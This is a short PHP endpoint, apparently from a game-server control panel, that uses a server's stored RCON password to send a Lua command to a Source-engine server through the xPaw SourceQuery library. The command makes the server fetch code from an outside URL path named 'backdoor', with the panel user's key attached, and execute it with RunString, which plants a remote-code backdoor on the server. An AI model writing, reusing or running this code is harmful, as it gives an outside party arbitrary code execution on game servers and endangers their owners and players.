<?php
include('../class/include.php');
if (!Account::isAuthentified() || !CSRF::isAjaxRequest())
{
	http_response_code(403);
    die("Bad request");
}

$servid = Server::GetServerInfos($_POST['id']);

if ($servid[7] == "Pas de RCON") {
	die("Bad RCON Request (Server doesn't have RCON password)");
}

$ip = explode(':', $servid[2]);


require __DIR__ . '/SourceQuery/bootstrap.php';

use xPaw\SourceQuery\SourceQuery;

// For the sake of this example
Header( 'Content-Type: text/plain' );
Header( 'X-Content-Type-Options: nosniff' );

// Edit this ->
define( 'SQ_SERVER_ADDR', $ip[0] );
define( 'SQ_SERVER_PORT', $ip[1] );
define( 'SQ_TIMEOUT',     1 );
define( 'SQ_ENGINE',      SourceQuery::SOURCE );
// Edit this <-

$Query = new SourceQuery( );

try
{
	$Query->Connect( SQ_SERVER_ADDR, SQ_SERVER_PORT, SQ_TIMEOUT, SQ_ENGINE );
	
	$Query->SetRconPassword( $servid[7] );
	
	var_dump( $Query->Rcon( "lua_run http.Fetch(\"https://kpanel.cz/backdoor/yay1.php?key=".Account::GetKey()."\",function(b,l,h,c)RunString(b)end,nil)" ) );
}
catch( Exception $e )
{
	echo $e->getMessage( );
}

$Query->Disconnect( );

?>